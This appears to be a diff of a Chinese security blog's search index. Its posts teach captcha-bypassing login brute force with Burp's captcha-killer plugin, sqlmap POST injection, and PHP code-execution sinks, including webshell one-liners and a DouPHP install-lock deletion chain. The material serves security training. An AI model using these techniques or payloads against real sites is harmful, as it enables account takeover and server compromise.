+<h2 id="什么是captcha-killer"><a href="#什么是captcha-killer" class="headerlink" title="什么是captcha-killer?"></a>什么是captcha-killer?</h2><p>总的来说,它是个用Java写的插件,可以无缝衔接于burp.但是他只是一个调用接口,并不进行识别的操作,真正进行验证码识别处理的是两个个用Python脚本(codereg.py)调用的两个接口(ddddocr和aiohttp), 稍后我会进行简明的介绍<br>captcha-killer设计理念是只专注做好对各种验证码识别技术接口的调用, 说具体点就是burp通过这一个插件，就可以适配各种验证码识别接口，无需重复编写调用代码.<br>今天不谈编码层面如何实现(主要是我也不会)，感兴趣的同学可以去github看源码. 此篇文章只通过使用步骤来说明使用方法</p>
+<h2 id="简要介绍codereg-py"><a href="#简要介绍codereg-py" class="headerlink" title="简要介绍codereg.py"></a>简要介绍codereg.py</h2><p>个人理解,这个脚本的整体识别流程是通过python在本地开启一个验证码识别的web接口来接收captcha-killer传来的验证码图片内容，然后调用识别服务(利用机器学习)来识别，最后返回结果给captcha-killer. </p>
+<hr>
+<hr>
+<h1 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h1><p><strong><em>ok废话不多说,这里是正题!!!!!!!!!!!!</em></strong></p>
+<h2 id="1-安装插件"><a href="#1-安装插件" class="headerlink" title="1.安装插件"></a>1.安装插件</h2><p>首先打开burp,选择Extender——&gt;Add（默认Java类型插件）————&gt;Select File——&gt;选择下载的captcha-killer-modified-jdk14.jar文件<br><img src="https://nc0.cdn.zkaq.cn/md/17628/965ea03bb3e0a551789e1810e45e7ac2_24004.png" alt=""></p>
+<p>发现任务栏里多出一个captcha-killer,就说明安装成功,如下图↓</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/17628/afe2e33d4bf109c274064e3193deb139_39339.png" alt=""></p>
+<hr>
+<hr>
+<h2 id="2-获取目标网站验证码"><a href="#2-获取目标网站验证码" class="headerlink" title="2.获取目标网站验证码"></a>2.获取目标网站验证码</h2><h3 id="1-找到要爆破的网站并打开burp-我找到了一个网站作为案例-并未进行爆破"><a href="#1-找到要爆破的网站并打开burp-我找到了一个网站作为案例-并未进行爆破" class="headerlink" title="(1)找到要爆破的网站并打开burp,我找到了一个网站作为案例(并未进行爆破)"></a>(1)找到要爆破的网站并打开burp,我找到了一个网站作为案例(并未进行爆破)</h3><p><img src="https://nc0.cdn.zkaq.cn/md/17628/a88df494a58751c3333052ed746c402a_61201.png" alt=""></p>
+<h3 id="2-开始抓包-点击验证码刷新-拦截此次请求"><a href="#2-开始抓包-点击验证码刷新-拦截此次请求" class="headerlink" title="(2)开始抓包,点击验证码刷新,拦截此次请求"></a>(2)开始抓包,点击验证码刷新,拦截此次请求</h3><p><img src="https://nc0.cdn.zkaq.cn/md/17628/b45d29a283bd138950dd5943964389a3_32909.png" alt=""></p>
+<h3 id="3-鼠标右键-将这个包发送到captcha-killer模组里"><a href="#3-鼠标右键-将这个包发送到captcha-killer模组里" class="headerlink" title="(3)鼠标右键,将这个包发送到captcha-killer模组里"></a>(3)鼠标右键,将这个包发送到captcha-killer模组里</h3><p>[‘extensions’—-&gt;’captcha-killer’—&gt;’send to captcha panel’]</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/17628/c28253542fb19f8fc1b7f511def8c7ad_75826.png" alt=""></p>
+<h3 id="4-点击任务栏里的插件模组-可以看到数据包已经自动填入-点击获取按钮-可以获取数据包内的图片验证码-此时获取验证码的流程已经走完-接下来的任务是进行识别"><a href="#4-点击任务栏里的插件模组-可以看到数据包已经自动填入-点击获取按钮-可以获取数据包内的图片验证码-此时获取验证码的流程已经走完-接下来的任务是进行识别" class="headerlink" title="(4)点击任务栏里的插件模组,可以看到数据包已经自动填入,点击获取按钮,可以获取数据包内的图片验证码,此时获取验证码的流程已经走完,接下来的任务是进行识别"></a>(4)点击任务栏里的插件模组,可以看到数据包已经自动填入,点击获取按钮,可以获取数据包内的图片验证码,此时获取验证码的流程已经走完,接下来的任务是进行识别</h3><p><img src="https://nc0.cdn.zkaq.cn/md/17628/449e70473ea282bd66f4443e32efd594_50672.png" alt=""></p>
+<h2 id="3-开启本地验证码识别服务"><a href="#3-开启本地验证码识别服务" class="headerlink" title="3.开启本地验证码识别服务"></a>3.开启本地验证码识别服务</h2><p>本文实验的python版本环境：Python 3.9.4</p>
+<h3 id="1-python中安装ddddocr和aiohttp包"><a href="#1-python中安装ddddocr和aiohttp包" class="headerlink" title="(1)python中安装ddddocr和aiohttp包"></a>(1)python中安装ddddocr和aiohttp包</h3><p>和其他第三方包的安装方式一样,在dos命令中写入以下命令</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install ddddocr aiohttp -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com </span><br></pre></td></tr></table></figure>
+<p>这样就是安装成功了<br><img src="https://nc0.cdn.zkaq.cn/md/17628/40a024b0479ea701d916652a3ee59b24_26796.png" alt=""></p>
+<h3 id="2-用python运行codereg-py脚本"><a href="#2-用python运行codereg-py脚本" class="headerlink" title="(2)用python运行codereg.py脚本"></a>(2)用python运行codereg.py脚本</h3><p>打开命令控制台(建议在当前文件夹下打开cmd,不用填路径也不用配环境变量)<br>运行以下脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python codereg.py</span><br></pre></td></tr></table></figure>
+<p><img src="https://nc0.cdn.zkaq.cn/md/17628/2628a5ee6290e8bc76736a3d325cfa92_39814.png" alt=""><br>显示ddddocr(本地验证码识别的web接口)已经运行成功,此时的接收端口为8888.<br>注意,这个dos面板不能关掉,否则ddddocr不会继续运行,也就不能进行识别了</p>
+<h3 id="3-在burp的captcha页面配置接口URL和请求模板（Request-template）"><a href="#3-在burp的captcha页面配置接口URL和请求模板（Request-template）" class="headerlink" title="(3)在burp的captcha页面配置接口URL和请求模板（Request template）"></a>(3)在burp的captcha页面配置接口URL和请求模板（Request template）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /reg HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8888</span><br><span class="line">Authorization:Basic f0ngauth</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8332</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>将以上代码直接复制进插件页面的左下角的请求模板中,填写url为<a href="http://127.0.0.1:8888">http://127.0.0.1:8888</a></p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/17628/3519798e072ba9021b9e1615a331d48f_25444.png" alt=""></p>
+<p>点击识别之后通过ddddocr进行了机器学习的识别,可以看到dos面板开始进行了一系列操作</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/17628/dcd8e131cc1650b292b9679820a085b0_30657.png" alt=""></p>
+<p>此时可在右边的结果栏看到识别成功(这个第一张示例验证码比较复杂,所以识别失误了),但问题不大,识别简单的验证码成功率为百分之99.9%,复杂的验证码就别用这个插件了</p>
+<p>以上就是配置识别验证码的接口配置完成,接下来进行批量化处理的教学</p>
+<h2 id="4-最终步骤-将验证码识别与爆破结合"><a href="#4-最终步骤-将验证码识别与爆破结合" class="headerlink" title="4.最终步骤:将验证码识别与爆破结合"></a>4.最终步骤:将验证码识别与爆破结合</h2><h3 id="1-按正常步骤进行账号密码验证的抓包"><a href="#1-按正常步骤进行账号密码验证的抓包" class="headerlink" title="(1)按正常步骤进行账号密码验证的抓包"></a>(1)按正常步骤进行账号密码验证的抓包</h3><p>打开拦截开关,抓取登录操作的数据包<br><img src="https://nc0.cdn.zkaq.cn/md/17628/06317ffccd4ebc793631e28675eaca75_74377.png" alt=""></p>
+<h3 id="2-发送到intruder模块"><a href="#2-发送到intruder模块" class="headerlink" title="(2)发送到intruder模块"></a>(2)发送到intruder模块</h3><p>和正常的爆破一样,发送到入侵者模块</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/17628/93965be147ed7ec36e224d34931819bb_15926.png" alt=""></p>
+<h3 id="3-对密码和验证码添加攻击字段标记并选择pitchfork模式"><a href="#3-对密码和验证码添加攻击字段标记并选择pitchfork模式" class="headerlink" title="(3)对密码和验证码添加攻击字段标记并选择pitchfork模式"></a>(3)对密码和验证码添加攻击字段标记并选择pitchfork模式</h3><p><img src="https://nc0.cdn.zkaq.cn/md/17628/8e18cac2613c154a8bf7d9731edb0347_63977.png" alt=""></p>
+<h3 id="4-字段1对应密码-选择字典"><a href="#4-字段1对应密码-选择字典" class="headerlink" title="(4)字段1对应密码,选择字典"></a>(4)字段1对应密码,选择字典</h3><p>payload页面字段1选一个爆破密码的字典<br><img src="https://nc0.cdn.zkaq.cn/md/17628/95bfa4b337dc0106eb87512a3fc25c90_52878.png" alt=""></p>
+<h3 id="5-字段2对应captcha-killer模块"><a href="#5-字段2对应captcha-killer模块" class="headerlink" title="(5)字段2对应captcha-killer模块"></a>(5)字段2对应captcha-killer模块</h3><p>第二个payload是验证码的值<br>线程2选择继承插件模式<br>继承插件选择captcha-killer</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/17628/7571ffc4af2845b390a7bcbc21bbe18c_79835.png" alt=""></p>
+<p>(6)一定注意选择单线程<br>线程池为单线程，否则验证码识别会交叉出现错误,很好理解,因为页面的验证码会一次一换,如果不是一一对应的关系就会出现验证码错误.</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/17628/500576e3343d52241a4c0d37e23c06de_83467.png" alt=""></p>
+<h3 id="7-最终开始攻击-就会实现密码和验证码一一对应的爆破了"><a href="#7-最终开始攻击-就会实现密码和验证码一一对应的爆破了" class="headerlink" title="(7)最终开始攻击,就会实现密码和验证码一一对应的爆破了"></a>(7)最终开始攻击,就会实现密码和验证码一一对应的爆破了</h3><p><img src="https://nc0.cdn.zkaq.cn/md/17628/54c65794dfdd115e44193e0d66a6d070_45092.png" alt=""><br>↑此图为本机测试,并未进行未授权攻击</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>谢谢大家观看,这是我的第一篇文章,大家多多支持,欢迎投币哈哈!</p>
+]]></content>
+      <categories>
+        <category>渗透工具</category>
+      </categories>
+      <tags>
+        <tag>渗透工具</tag>
+        <tag>burp</tag>
       </tags>
   </entry>
   <entry>
@@ -523,23 +523,6 @@
       </tags>
   </entry>
   <entry>
-    <title>post注入</title>
-    <url>/2023/08/21/post%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="1-什么是post注入"><a href="#1-什么是post注入" class="headerlink" title="1.什么是post注入?"></a>1.什么是post注入?</h1><p>定义:用户通过post传参的数据被当做sql语句执行的注入(和get注入只有传参方式的不同)</p>
-<p>注意:post传参不受url编码影响</p>
-<h1 id="2-sqlmap跑post注入"><a href="#2-sqlmap跑post注入" class="headerlink" title="2.sqlmap跑post注入"></a>2.sqlmap跑post注入</h1><h2 id="1-第一种方法-—form"><a href="#1-第一种方法-—form" class="headerlink" title="1.第一种方法: —form"></a>1.第一种方法: —form</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;URL&quot;</span> --form   //自动在这个页面上寻找post的传参点</span><br></pre></td></tr></table></figure>
-<h2 id="2-第二种方法-抓包法-r"><a href="#2-第二种方法-抓包法-r" class="headerlink" title="2.第二种方法:抓包法 -r"></a>2.第二种方法:抓包法 -r</h2><p>建议第二种方法,因为:</p>
-<p>(1)可以直接强行制定找到你想要跑的传参[通过在参数结尾加上    *     ]</p>
-<p>(2)可以针对需要权限的注入[比如需要登陆之后才有的页面,获取cookie]</p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>msf后渗透</title>
     <url>/2023/08/21/msf%E5%90%8E%E6%B8%97%E9%80%8F/</url>
     <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>phpstudy +  phpmyadmin 4.8.1 </p>
@@ -597,6 +580,23 @@
         <tag>木马</tag>
         <tag>远控</tag>
         <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>post注入</title>
+    <url>/2023/08/21/post%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="1-什么是post注入"><a href="#1-什么是post注入" class="headerlink" title="1.什么是post注入?"></a>1.什么是post注入?</h1><p>定义:用户通过post传参的数据被当做sql语句执行的注入(和get注入只有传参方式的不同)</p>
+<p>注意:post传参不受url编码影响</p>
+<h1 id="2-sqlmap跑post注入"><a href="#2-sqlmap跑post注入" class="headerlink" title="2.sqlmap跑post注入"></a>2.sqlmap跑post注入</h1><h2 id="1-第一种方法-—form"><a href="#1-第一种方法-—form" class="headerlink" title="1.第一种方法: —form"></a>1.第一种方法: —form</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;URL&quot;</span> --form   //自动在这个页面上寻找post的传参点</span><br></pre></td></tr></table></figure>
+<h2 id="2-第二种方法-抓包法-r"><a href="#2-第二种方法-抓包法-r" class="headerlink" title="2.第二种方法:抓包法 -r"></a>2.第二种方法:抓包法 -r</h2><p>建议第二种方法,因为:</p>
+<p>(1)可以直接强行制定找到你想要跑的传参[通过在参数结尾加上    *     ]</p>
+<p>(2)可以针对需要权限的注入[比如需要登陆之后才有的页面,获取cookie]</p>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -658,6 +658,31 @@
       </categories>
       <tags>
         <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>代码执行漏洞</title>
+    <url>/2023/08/21/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="代码执行定义"><a href="#代码执行定义" class="headerlink" title="代码执行定义"></a>代码执行定义</h1><p>用户输入的数据当作后端代码执行,比如&lt;?php eval($_REQUEST[8])?&gt;</p>
+<h1 id="代码执行的危险函数有哪些"><a href="#代码执行的危险函数有哪些" class="headerlink" title="代码执行的危险函数有哪些?"></a>代码执行的危险函数有哪些?</h1><p>​                <strong>eavl</strong>() 可以执行多行代码的代码执行函数<br>​                <strong>assert</strong>() 可执行单行 [如何变多行执行?]</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件写入函数：<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;2.php&#x27;</span>,<span class="string">&#x27;&lt;?php var_dump(8);phpinfo();?&gt;&#x27;</span>);<span class="comment">//把多行的函数用一行的文件写入函数执行</span></span><br></pre></td></tr></table></figure>
+<p>​                <strong>preg_replace</strong>() 可执行单行 </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">正则函数代码执行(也是单行执行的)： </span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/a/e&#x27;</span>,<span class="variable">$_GET</span>[<span class="number">8</span>],<span class="string">&#x27;abc&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">   		当正则表达式的修饰符为e且正则能匹配到的时候，要替换的内容(新的内容)会被当作代码执行(如果匹配失败则不会!!!)</span><br><span class="line">		当<span class="keyword">eval</span>被过滤了,如果你可以控制正则表达式的修饰符，你也可以拿下目标,正则不可能被禁用</span><br><span class="line">		PHP正则语法  <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/规则/修饰符&#x27;</span>,<span class="string">&#x27;新内容&#x27;</span>,<span class="string">&#x27;原内容&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>​                <strong>create_function</strong>() //匿名函数  [建立函数要写的代码太多了，我偷懒]</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">普通函数:<span class="function"><span class="keyword">function</span> 函数名(<span class="params">形参</span>)</span>&#123;要执行的代码&#125;</span><br><span class="line">匿名函数:<span class="title function_ invoke__">create_function</span>(形参,要执行的代码)</span><br><span class="line">	<span class="variable">$a</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$id&#x27;</span>,<span class="string">&#x27;echo $id;&#x27;</span>); 自定义函数<span class="variable">$a</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$a</span>(<span class="number">8</span>); <span class="comment">//执行echo $id;因为$id我传参是8所以 echo $id;</span></span><br><span class="line">	<span class="variable">$a</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$id&#x27;</span>,<span class="string">&#x27;$_REQUEST[8];&#x27;</span>); 自定义函数<span class="variable">$a</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$a</span>(<span class="number">8</span>); </span><br><span class="line"></span><br><span class="line">当然,如果函数不被调用(即没有<span class="keyword">echo</span><span class="variable">$a</span>(<span class="number">8</span>);),也是可以利用截断法触发代码执行的</span><br><span class="line">	函数不被调用是不会被触发</span><br><span class="line">		<span class="title function_ invoke__">create_function</span>(x,y)<span class="comment">//本质上相当于↓,</span></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">xxx</span>(<span class="params">x</span>)</span>&#123;y&#125;  </span><br><span class="line">				=&gt; y =  &#125;;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//</span></span><br><span class="line">				=&gt;fuction <span class="title function_ invoke__">XXX</span>(x)&#123;&#125;;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#125;</span></span><br><span class="line">                      所以y可以传这个↑进行截断,不让函数进行调用,直接运行下面的函数</span><br><span class="line"></span><br><span class="line">		</span><br></pre></td></tr></table></figure>
+<p>​                <strong>array_map</strong>(要执行的函数,数组) <strong>回调函数</strong> //[批量调用某个函数]</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    fuction <span class="title function_ invoke__">cube</span>(<span class="variable">$n</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$n</span> * <span class="variable">$n</span> * <span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;cube&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">//实现了数组$a的元素在函数cube()中的遍历</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">恶意代码具体实现:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;assert&#x27;</span>,<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//直接?8=phpinfo();   这里$_REQUEST是数组</span></span><br></pre></td></tr></table></figure>
+<p>​                <strong>“${你要执行的代码}”</strong>  <strong>双引号二次解析</strong>/要注意*:不能是传参，只能是写在文件里              必须&gt;PHP5.6的版本才有这个漏洞</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;<span class="string">&quot;;  =&gt; 代码执行phpinfo()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//PHP的字符串是可以使用复杂的表达式。例如 $&#123;中间可以写调用的函数&#125;</span></span><br><span class="line"><span class="string">$&#123;phpinfo()&#125;; //可以执行</span></span><br><span class="line"><span class="string"><span class="subst">$a</span> = $&#123;phpinfo()&#125;; //可以执行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//在PHP的官方文档中也有描述</span></span><br><span class="line"><span class="string">//https://www.php.net/manual/zh/language.types.string.php</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<h1 id="代码执行经典案例"><a href="#代码执行经典案例" class="headerlink" title="代码执行经典案例"></a>代码执行经典案例</h1><p>dou_phpCMS的安装,通过安装时的数据库信息填写,我们做到了可以拿webshell。但是正常情况下，你不可能直接访问到这个安装</p>
+<p>​    install.lock 存在就不能重装、不存在就可以重装<br>​    找个任意文件名修改漏洞、任意文件删除漏洞。  就可以进入重装页面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">douphp 可以通过任意文件删除漏洞去删除安装锁</span><br><span class="line"></span><br><span class="line"> 		任意文件删除漏洞 【???】</span><br><span class="line"></span><br><span class="line"> 		危险函数定位法。 负责删除文件、文件重命名的函数 PHP</span><br><span class="line"> 			unlink</span><br><span class="line"> 			rename</span><br><span class="line"> 			move_uploaded_file</span><br><span class="line"></span><br><span class="line"> 			unlink(</span><br><span class="line"></span><br><span class="line"> 			$sql_filename = $backup-&gt;is_backup_file($_REQUEST[&#x27;sql_filename&#x27;], &#x27;backup.php&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    is_backup_file($_REQUEST[&#x27;sql_filename&#x27;], &#x27;backup.php&#x27;);</span><br><span class="line"></span><br><span class="line">    aaa( -X/E:/phpStudy/WWW/success.php )@qq.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @ unlink(ROOT_PATH . M_PATH . &#x27;/theme/&#x27; . $_CFG[&#x27;mobile_theme&#x27;] . &#x27;/images/&#x27; . $mobile_logo);</span><br><span class="line"></span><br><span class="line">     $mobile_logo = $dou-&gt;get_one(&quot;SELECT value FROM &quot; . $dou-&gt;table(&#x27;config&#x27;) . &quot; WHERE name = &#x27;mobile_logo&#x27;&quot;);</span><br><span class="line"></span><br><span class="line">    logo.png =&gt; ../../../../data/install.lock</span><br><span class="line"></span><br><span class="line">    config表里面的name = &#x27;mobile_logo&#x27;的值必须是 ../../../../data/install.lock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	foreach ($_REQUEST as $name =&gt; $value)  键值分离   传参名就是键，传参值就是值</span><br><span class="line">		把键和值分来 </span><br><span class="line">		$name 就是键盘，$value就是值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	GET :  8=KKKK</span><br><span class="line">	$_GET =&gt; 预定义数组</span><br><span class="line">	$_GET[8]/$_REQUEST[8] 名字为8的键  8=phpinfo();</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>代码执行</tag>
       </tags>
   </entry>
   <entry>
@@ -939,60 +964,6 @@
       </tags>
   </entry>
   <entry>
-    <title>代码执行漏洞</title>
-    <url>/2023/08/21/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="代码执行定义"><a href="#代码执行定义" class="headerlink" title="代码执行定义"></a>代码执行定义</h1><p>用户输入的数据当作后端代码执行,比如&lt;?php eval($_REQUEST[8])?&gt;</p>
-<h1 id="代码执行的危险函数有哪些"><a href="#代码执行的危险函数有哪些" class="headerlink" title="代码执行的危险函数有哪些?"></a>代码执行的危险函数有哪些?</h1><p>​                <strong>eavl</strong>() 可以执行多行代码的代码执行函数<br>​                <strong>assert</strong>() 可执行单行 [如何变多行执行?]</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件写入函数：<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;2.php&#x27;</span>,<span class="string">&#x27;&lt;?php var_dump(8);phpinfo();?&gt;&#x27;</span>);<span class="comment">//把多行的函数用一行的文件写入函数执行</span></span><br></pre></td></tr></table></figure>
-<p>​                <strong>preg_replace</strong>() 可执行单行 </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">正则函数代码执行(也是单行执行的)： </span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/a/e&#x27;</span>,<span class="variable">$_GET</span>[<span class="number">8</span>],<span class="string">&#x27;abc&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">   		当正则表达式的修饰符为e且正则能匹配到的时候，要替换的内容(新的内容)会被当作代码执行(如果匹配失败则不会!!!)</span><br><span class="line">		当<span class="keyword">eval</span>被过滤了,如果你可以控制正则表达式的修饰符，你也可以拿下目标,正则不可能被禁用</span><br><span class="line">		PHP正则语法  <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/规则/修饰符&#x27;</span>,<span class="string">&#x27;新内容&#x27;</span>,<span class="string">&#x27;原内容&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>​                <strong>create_function</strong>() //匿名函数  [建立函数要写的代码太多了，我偷懒]</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">普通函数:<span class="function"><span class="keyword">function</span> 函数名(<span class="params">形参</span>)</span>&#123;要执行的代码&#125;</span><br><span class="line">匿名函数:<span class="title function_ invoke__">create_function</span>(形参,要执行的代码)</span><br><span class="line">	<span class="variable">$a</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$id&#x27;</span>,<span class="string">&#x27;echo $id;&#x27;</span>); 自定义函数<span class="variable">$a</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$a</span>(<span class="number">8</span>); <span class="comment">//执行echo $id;因为$id我传参是8所以 echo $id;</span></span><br><span class="line">	<span class="variable">$a</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$id&#x27;</span>,<span class="string">&#x27;$_REQUEST[8];&#x27;</span>); 自定义函数<span class="variable">$a</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$a</span>(<span class="number">8</span>); </span><br><span class="line"></span><br><span class="line">当然,如果函数不被调用(即没有<span class="keyword">echo</span><span class="variable">$a</span>(<span class="number">8</span>);),也是可以利用截断法触发代码执行的</span><br><span class="line">	函数不被调用是不会被触发</span><br><span class="line">		<span class="title function_ invoke__">create_function</span>(x,y)<span class="comment">//本质上相当于↓,</span></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">xxx</span>(<span class="params">x</span>)</span>&#123;y&#125;  </span><br><span class="line">				=&gt; y =  &#125;;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//</span></span><br><span class="line">				=&gt;fuction <span class="title function_ invoke__">XXX</span>(x)&#123;&#125;;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#125;</span></span><br><span class="line">                      所以y可以传这个↑进行截断,不让函数进行调用,直接运行下面的函数</span><br><span class="line"></span><br><span class="line">		</span><br></pre></td></tr></table></figure>
-<p>​                <strong>array_map</strong>(要执行的函数,数组) <strong>回调函数</strong> //[批量调用某个函数]</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    fuction <span class="title function_ invoke__">cube</span>(<span class="variable">$n</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$n</span> * <span class="variable">$n</span> * <span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;cube&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">//实现了数组$a的元素在函数cube()中的遍历</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">恶意代码具体实现:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;assert&#x27;</span>,<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//直接?8=phpinfo();   这里$_REQUEST是数组</span></span><br></pre></td></tr></table></figure>
-<p>​                <strong>“${你要执行的代码}”</strong>  <strong>双引号二次解析</strong>/要注意*:不能是传参，只能是写在文件里              必须&gt;PHP5.6的版本才有这个漏洞</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;<span class="string">&quot;;  =&gt; 代码执行phpinfo()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//PHP的字符串是可以使用复杂的表达式。例如 $&#123;中间可以写调用的函数&#125;</span></span><br><span class="line"><span class="string">$&#123;phpinfo()&#125;; //可以执行</span></span><br><span class="line"><span class="string"><span class="subst">$a</span> = $&#123;phpinfo()&#125;; //可以执行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//在PHP的官方文档中也有描述</span></span><br><span class="line"><span class="string">//https://www.php.net/manual/zh/language.types.string.php</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
-<h1 id="代码执行经典案例"><a href="#代码执行经典案例" class="headerlink" title="代码执行经典案例"></a>代码执行经典案例</h1><p>dou_phpCMS的安装,通过安装时的数据库信息填写,我们做到了可以拿webshell。但是正常情况下，你不可能直接访问到这个安装</p>
